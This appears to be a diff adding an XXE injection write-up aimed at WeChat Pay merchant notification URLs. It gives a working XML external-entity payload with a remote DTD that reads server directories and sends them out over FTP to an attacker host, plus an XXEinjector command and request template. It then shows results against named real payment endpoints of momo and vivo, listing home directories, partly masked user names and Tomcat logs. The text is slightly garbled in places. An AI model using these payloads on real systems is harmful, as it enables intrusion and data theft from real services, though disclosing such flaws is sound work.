@@ -1,0 +1,153 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE root [
+
+  <!ENTITY % attack SYSTEM "file:///etc/">
+
+  <!ENTITY % xxe SYSTEM "http://attacker:8080/shell/data.dtd">
+
+  %xxe;
+
+]>
+
+
+data.dtd:
+
+
+<!ENTITY % shell "<!ENTITY &#x25; upload SYSTEM 'ftp://attack:33/%attack;
+'>">
+
+%shell;
+
+%upload;
+
+
+
+or use  XXEinjector tool  ahttps://github.com/enjoiz/XXEinjectora
+
+
+ruby XXEinjector.rb --host=attacker --path=/etc   --file=req.txt --ssl
+
+
+req.txt :
+
+POST merchant_notification_url HTTP/1.1
+
+Host:  merchant_notification_url_host
+
+User-Agent: curl/7.43.0
+
+Accept: */*
+
+Content-Length: 57
+
+Content-Type: application/x-www-form-urlencoded
+
+
+XXEINJECT
+
+
+
+
+
+In order to prove this, I got 2 chinese famous company:
+
+   aamomo: Well-known chat tools like WeChat
+
+   bavivo i1/4China's famous mobile phone,that also famous in my country
+
+
+
+Example  momo :
+
+  attack:
+
+     notify url:    https://pay.immomo.com/weixin/notify
+
+              cmd:  /home/
+
+
+
+      result:
+
+
+
+      ***
+
+      logs
+
+      zhang.jiax**
+
+      zhang.shaol**
+
+      zhang.xia**
+
+      ****
+
+
+    attack:
+
+     notify url:    https://pay.immomo.com/weixin/notify
+
+              cmd:  /home/logs
+
+
+
+      result:
+
+      ***
+
+       moa-service
+
+       momotrace
+
+      ****
+
+
+Example  vivo :
+
+  attack:
+
+     notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo
+
+              cmd: /home/
+
+
+
+      result:
+
+         tomcat
+
+
+  attack:
+
+     notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo
+
+              cmd: /home/tomcat
+
+     result:
+
+        .bash_logout
+
+.bash_profile
+
+.bashrc
+
+logs
+
+
+ attack:
+
+     notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo
+
+              cmd: /home/tomcat/logs
+
+     result:
+
+           ****
+
+           tomcat-2018-06-28.log
+
+  tomcat-2018-06-29.log
+
+  tomcat-2018-06-30.log
